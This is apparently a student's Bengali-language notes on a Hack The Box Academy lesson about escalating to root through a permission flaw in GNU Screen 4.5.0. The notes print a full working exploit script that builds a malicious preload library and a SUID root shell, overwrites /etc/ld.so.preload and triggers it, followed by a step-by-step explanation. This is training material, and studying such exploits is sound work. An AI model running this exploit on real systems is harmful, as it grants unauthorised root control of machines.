# Vulnerable Services - [LINK](https://academy.hackthebox.com/app/module/51/section/468)


লিনাক্স সিস্টেমে অনেক সময় এমন কিছু সার্ভিস বা সফটওয়্যার ইন্সটল করা থাকে, যেগুলোর নিজস্ব দুর্বলতা (Vulnerability) ব্যবহার করে হ্যাকাররা সিস্টেমের রুট (Root) অ্যাক্সেস নিয়ে নিতে পারে। এই সেকশনে আমরা অত্যন্ত জনপ্রিয় একটি টার্মিনাল মাল্টিপ্লেক্সার **Screen** এর একটি নির্দিষ্ট ভার্সনের (4.5.0) দুর্বলতা নিয়ে আলোচনা করব।

এই ভার্সনটিতে একটি বড় সমস্যা হলো, এটি যখন কোনো লগ (Log) ফাইল ওপেন করে বা তৈরি করে, তখন এটি ঠিকমতো পারমিশন চেক করে না। এর ফলে একজন সাধারণ ইউজার এই টুলটি ব্যবহার করে সিস্টেমের যেকোনো ডিরেক্টরিতে রুট মালিকানাধীন ফাইল তৈরি করতে বা এডিট করতে পারে।

### ১. Screen এর ভার্সন চেক করা

যেকোনো টুলের দুর্বলতা কাজে লাগানোর আগে তার ভার্সনটি চেক করে নেওয়া জরুরি।

**কমান্ড:**

```bash
00Luffy00@htb[/htb]$ screen -v

```

**আউটপুট:**

```text
Screen version 4.05.00 (GNU) 10-Dec-16

```

আউটপুট থেকে নিশ্চিত হওয়া গেল যে সিস্টেমটিতে 4.5.0 ভার্সনটি চলছে, যা এই অ্যাটাকের জন্য একদম উপযুক্ত।

### ২. প্রিভিলেজ এসকালেশন স্ক্রিপ্ট (Screen_Exploit.sh)

এই অ্যাটাকটি সফলভাবে করার জন্য একটি ব্যাশ স্ক্রিপ্ট ব্যবহার করা হয়। এই স্ক্রিপ্টটি ব্যাকগ্রাউন্ডে C ল্যাঙ্গুয়েজে লেখা দুটি ছোট প্রোগ্রাম তৈরি করে এবং কম্পাইল করে। C এবং C++ দিয়ে টুল বা স্ক্রিপ্ট ডেভেলপ করার চর্চা থাকলে এর ভেতরের লজিকগুলো ধরতে বেশ সুবিধাই হবে।

প্রথমে আমরা পুরো স্ক্রিপ্টটি দেখব এবং তারপর ধাপে ধাপে এর কাজ বুঝব।

**পুরো স্ক্রিপ্ট (Screen_Exploit_POC.sh):**

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

# ধাপ ১: ম্যালিশিয়াস লাইব্রেরি তৈরি করা
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

# ধাপ ২: রুট শেল প্রোগ্রাম তৈরি করা
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

# ধাপ ৩: Screen এর দুর্বলতা ব্যবহার করে ফাইল ওভাররাইট করা
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"

# ধাপ ৪: অ্যাটাক ট্রিগার করা
echo "[+] Triggering..."
screen -ls
/tmp/rootshell

```

### ৩. স্ক্রিপ্টটি ঠিক কীভাবে কাজ করে? (Step-by-Step Breakdown)

পুরো হ্যাকিং প্রক্রিয়াটি মূলত `/etc/ld.so.preload` নামের একটি স্পেশাল সিস্টেম ফাইলের ওপর নির্ভর করে। এই ফাইলে যদি কোনো শেয়ারড লাইব্রেরি (`.so` ফাইল) এর নাম লেখা থাকে, তবে লিনাক্স যেকোনো প্রোগ্রাম রান করার আগে সবার প্রথমে ওই লাইব্রেরিটি লোড করে।

**ধাপ ১: ম্যালিশিয়াস লাইব্রেরি (libhax.c) তৈরি ও কম্পাইল**
স্ক্রিপ্টটি প্রথমে `/tmp/libhax.c` নামে একটি C কোড লেখে। এর ভেতরে থাকা `dropshell` ফাংশনটির কাজ হলো `/tmp/rootshell` ফাইলটির মালিকানা রুটের (chown 0, 0) হাতে দেওয়া এবং এতে SUID পারমিশন (chmod 04755) সেট করে দেওয়া। এরপর কোডটি `gcc` ব্যবহার করে `libhax.so` নামের একটি শেয়ারড লাইব্রেরি হিসেবে কম্পাইল হয়।

**ধাপ ২: রুট শেল (rootshell.c) তৈরি ও কম্পাইল**
এরপর স্ক্রিপ্টটি `/tmp/rootshell.c` নামে আরেকটি সাধারণ C কোড লেখে, যার কাজ হলো নিজের ইউজার এবং গ্রুপ আইডি 0 (root) করে একটি `/bin/sh` শেল ওপেন করা। এটিকেও `gcc` দিয়ে কম্পাইল করে `/tmp/rootshell` বানানো হয়। এই মুহূর্তে এটি একটি সাধারণ ফাইল, এর রুট পাওয়ার নেই।

**ধাপ ৩: Screen এর বাগ (Bug) ব্যবহার করা**
এবার আসল ম্যাজিক শুরু হয়।

```bash
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

```

এখানে Screen এর লগিং ফিচার (`-L`) ব্যবহার করা হয়েছে। Screen কে বলা হচ্ছে, তুমি `/etc/ld.so.preload` নামে একটি লগ ফাইল তৈরি করো এবং তার ভেতরে `\x0a/tmp/libhax.so` লেখাটি সেভ করো। যেহেতু Screen 4.5.0 ঠিকমতো পারমিশন চেক করে না, সে সাধারণ ইউজারের কথা শুনেই রুট ডিরেক্টরির স্পেশাল ফাইলটি ওভাররাইট করে ফেলে!

**ধাপ ৪: ট্রিগার এবং রুট অ্যাক্সেস**

```bash
screen -ls
/tmp/rootshell

```

`screen -ls` কমান্ড দেওয়া মাত্রই, লিনাক্স সবার আগে `/etc/ld.so.preload` ফাইলটি চেক করে। সেখানে সে আমাদের ম্যালিশিয়াস `libhax.so` এর নাম দেখতে পায় এবং রুট পারমিশন নিয়ে সেটি লোড করে ফেলে।

লোড হওয়ার সাথে সাথেই আমাদের লাইব্রেরিটি তার কাজ করে দেয়— সে দ্রুত `/tmp/rootshell` ফাইলটিকে SUID রুট বানিয়ে দেয়। এরপর স্ক্রিপ্টের একদম শেষের লাইনে যখন `/tmp/rootshell` রান করা হয়, তখন আমরা সরাসরি রুট শেল পেয়ে যাই!
